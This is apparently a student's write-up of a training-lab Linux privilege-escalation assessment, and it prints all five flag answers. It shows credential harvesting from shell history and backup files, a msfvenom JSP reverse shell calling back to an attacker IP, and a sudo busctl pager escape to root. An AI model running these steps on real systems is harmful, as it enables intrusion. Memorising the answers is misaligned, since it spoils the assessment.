# Linux Local Privilege Escalation - Skills Assessment
We have been contracted to perform a security hardening assessment against one of the INLANEFREIGHT organizations' public-facing web servers.

The client has provided us with a low privileged user to assess the security of the server. Connect via SSH and begin looking for misconfigurations and other flaws that may escalate privileges using the skills learned throughout this module.

Once on the host, we must find five flags on the host, accessible at various privilege levels. Escalate privileges all the way from the `htb-student` user to the `root` user and submit all five flags to finish this module.

## Questions
SSH to 10.129.73.214 (ACADEMY-LLPE-SKILLS-NIX03), with user `htb-student` and password `Academy_LLPE!`
1. Submit the contents of flag1.txt **Answer: LLPE{d0n_ov3rl00k_h1dden_f1les!}**
   - Find hidden files and immediately found the flag:
        ```sh
        $ find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
        -rw-r--r-- 1 htb-student www-data 33 Sep  6  2020 /home/htb-student/.config/.flag1.txt
        -rw-r--r-- 1 htb-student htb-student 3771 Feb 25  2020 /home/htb-student/.bashrc
        -rw------- 1 htb-student htb-student 57 Sep  6  2020 /home/htb-student/.bash_history
        -rw-r--r-- 1 htb-student htb-student 220 Feb 25  2020 /home/htb-student/.bash_logout
        -rw-r--r-- 1 htb-student htb-student 807 Feb 25  2020 /home/htb-student/.profile
        $ cat /home/htb-student/.config/.flag1.txt
        LLPE{d0n_ov3rl00k_h1dden_f1les!}
        ```
   - Another way to to gain a shell is to login at http://blog.inlanefreight.local/wp-login.php using the default credential `admin`:`admin` and edit a PHP page to gain reverse shell.
2. Submit the contents of flag2.txt **Answer: LLPE{ch3ck_th0se_cmd_l1nes!}**
   - Look for history files → everyone has read access on `/home/barry/.bash_history`:
        ```sh
        $ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
        -rw------- 1 mrb3n mrb3n 14 Sep  8  2020 /home/mrb3n/.bash_history
        -rw------- 1 htb-student htb-student 57 Sep  6  2020 /home/htb-student/.bash_history
        -rwxr-xr-x 1 barry barry 360 Sep  6  2020 /home/barry/.bash_history
        ```
   - Read barry's `bash_history`, found his SSH password (`i_l0ve_s3cur1ty!`):
        ```sh
        $ cat /home/barry/.bash_history
        <SNIP>
        sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
        <SNIP>
        ```
   - SSH as barry and read the flag:
        ```sh
        $ ssh barry@10.129.73.214
        barry@nix03:~$ whoami
        barry
        barry@nix03:~$ ls
        flag2.txt
        barry@nix03:~$ cat flag2.txt
        LLPE{ch3ck_th0se_cmd_l1nes!}
        ```
3. Submit the contents of flag3.txt **Answer:**
   - Install and transfer `linpeas.sh` to barry's SSH session:
   - Run `linpeas.sh` notice this section:
        ```sh
        $ cd /tmp
        $ chmod +x linpeas.sh
        $ ./linpeas.sh
        <SNIP>
        ╔══════════╣ Readable files belonging to root and readable by me but not world readable (T1083)
        -rw-r----- 1 root adm 23 Sep  5  2020 /var/log/flag3.txt
        <SNIP>
        ```
   - Read the flag:
        ```sh
        $ cat /var/log/flag3.txt
        LLPE{h3y_l00k_a_fl@g!}
        ```
4. Submit the contents of flag4.txt **Answer: LLPE{im_th3_m@nag3r_n0w}**
   - The `linpeas.sh` tool also found the tomcat-users.xml.bak, which contains the manager credentials:
        ```sh
        ╔══════════╣ Backup files (limited 100) (T1552.001)
        ...
        -rwxr-xr-x 1 root barry 2232 Sep  5  2020 /etc/tomcat9/tomcat-users.xml.bak
        ```
        ```sh
        $ cat /etc/tomcat9/tomcat-users.xml.bak
        <SNIP>
        <user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>
        ```
   - Login with `tomcatadm`:`T0mc@t_s3cret_p@ss!` at the Tomcat manager GUI: http://blog.inlanefreight.local:8080/manager/html
   - As the manager we can upload a web shell using the msfvenom module:
        ```sh
        $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.192 LPORT=4443 -f war > payload.war
        Payload size: 1090 bytes
        Final size of war file: 1090 bytes
        $ nc -nlvp 4443
        Listening on 0.0.0.0 4443
        # after visiting http://blog.inlanefreight.local:8080/payload the reverse shell was established
        Connection received on 10.129.235.16 51646


        id
        uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
        script -qc /bin/bash /dev/null
        tomcat@nix03:/var/lib/tomcat9$ cat flag4.txt
        LLPE{im_th3_m@nag3r_n0w}
        ```
5. Submit the contents of flag5.txt **Answer: LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}**
   - Notice as user tomcat, we can run busctl as root, use it to escalate to root and read the final flag:
        ```sh
        tomcat@nix03:/var/lib/tomcat9$ sudo -l
                Matching Defaults entries for tomcat on nix03:
                    env_reset, mail_badpass,
                    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

                User tomcat may run the following commands on nix03:
                    (root) NOPASSWD: /usr/bin/busctl
        tomcat@nix03:/var/lib/tomcat9$ sudo busctl --show-machine
        WARNING: terminal is not fully functional
        -  (press RETURN)!/bin/bash
        root@nix03:~# cat /root/flag5.txt           
        cat /root/flag5.txt
        LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}
        ```